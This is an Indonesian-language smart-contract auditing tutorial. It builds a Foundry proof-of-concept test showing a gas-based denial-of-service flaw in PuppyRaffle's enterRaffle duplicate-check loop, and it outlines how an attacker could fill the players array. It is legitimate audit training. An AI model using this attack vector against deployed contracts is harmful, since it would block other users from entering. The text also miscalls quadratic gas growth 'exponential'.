# Proof of Code: DoS dalam PuppyRaffle

## Pendahuluan

Setelah mengidentifikasi potensi **Denial of Service (DoS)** vulnerability pada fungsi `enterRaffle`, kita akan membuktikannya melalui **Proof of Code (PoC)**.

## Vulnerability yang Didentifikasi

**Lokasi**: `PuppyRaffle.sol` - fungsi `enterRaffle`

```solidity
// Check for duplicates
// @audit Possible DoS
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```

**Masalah**: Nested loop untuk cek duplikasi memiliki kompleksitas O(n²) sehingga gas cost meningkat secara eksponensial seiring bertambahnya jumlah pemain.

## Strategi Proof of Code

Menggunakan test suite existing PuppyRaffle.t.sol sebagai boilerplate untuk:
1. Mengukur gas cost untuk batch pemain pertama (100 pemain)
2. Mengukur gas cost untuk batch pemain berikutnya (100 pemain)
3. Membuktikan bahwa gas cost meningkat secara signifikan

## Implementasi PoC

### Step 1: Setup Awal

Menggunakan contoh dari `testCanEnterRaffle`:

```javascript
function testCanEnterRaffle() public {
    address[] memory players = new address[](1);
    players[0] = playerOne;
    puppyRaffle.enterRaffle{value: entranceFee}(players);
    assertEq(puppyRaffle.players(0), playerOne);
}
```

### Step 2: Membuat Test Dos

#### Gas Calculation untuk Batch Pertama

```javascript
function testDenialOfService() public {
    // Set gas price untuk perhitungan
    vm.txGasPrice(1);
    
    // Buat 100 addresses untuk batch pertama
    uint256 playersNum = 100;
    address[] memory players = new address[](playersNum);
    for(uint i = 0; i < players.length; i++) {
        players[i] = address(i);
    }
    
    // Hitung gas untuk batch pertama
    uint256 gasStart = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
    uint256 gasEnd = gasleft();
    uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
    console.log("Gas cost of the first 100 players: ", gasUsedFirst);
}
```

**Command untuk run test**:
```bash
forge test --mt testDenialOfService -vvv
```

**Expected output**: Menampilkan gas cost untuk 100 pemain pertama.

### Step 3: Tambahkan Batch Kedua

```javascript
// Buat another array untuk 100 pemain kedua
address[] memory playersTwo = new address[](playersNum);
for (uint256 i = 0; i < playersTwo.length; i++) {
    playersTwo[i] = address(i + playersNum);
}

// Hitung gas untuk batch kedua
uint256 gasStartTwo = gasleft();
puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
uint256 gasEndTwo = gasleft();
uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;
console.log("Gas cost of the second 100 players: ", gasUsedSecond);

// Assert bahwa gas kedua lebih tinggi dari pertama
assert(gasUsedFirst < gasUsedSecond);
```

## Hasil Expected

- **Test passes**: Membuktikan gasUsedSecond > gasUsedFirst
- **Second 100 pemain**: Membayar gas yang **signifikan lebih tinggi**
- **Disadvantage**: Pemain yang masuk lebih akhir mengalami **significant disadvantage**

## Implikasi DoS

### Attack Vector
1. Attacker masuk sebagai pemain pertama dengan 100+ addresses
2. Array `players[]` menjadi besar
3. Pemain baru memerlukan gas yang sangat tinggi
4. Terjadi **DoS through gas limit**

### Severity
- **Medium**: Mengganggu fairness raffle
- **Attack Cost**: Buy-in minimum untuk 100 pemain
- **User Impact**: Pemain baru tidak bisa masuk atau rugi gas tinggi

## Integration dengan Report

Test function `testDenialOfService()` akan di-include dalam audit report sebagai:
- **Proof of Concept** untuk finding DoS
- **Reproducible test** yang bisa dijalankan oleh tim core
- **Kuantifikasi impact** melalui gas cost comparison

## Best Practices untuk PoC

1. **Start from existing tests**: Menggunakan struktur test suite yg sudah ada
2. **Minimal modifications**: Hanya tambahkan logic untuk ukur gas
3. **Clear assertions**: `assert(gasUsedFirst < gasUsedSecond)` untuk buktikan impact
4. **Log important metrics**: Console log untuk gas cost comparison

## Wrap Up

PoC telah berhasil membuktikan:
- Vulnerability DoS eksis dalam kode
- Gas cost meningkat secara signifikan
- Pemain akhir mengalami disadvantage
- Finding siap untuk dimasukkan ke dalam audit report
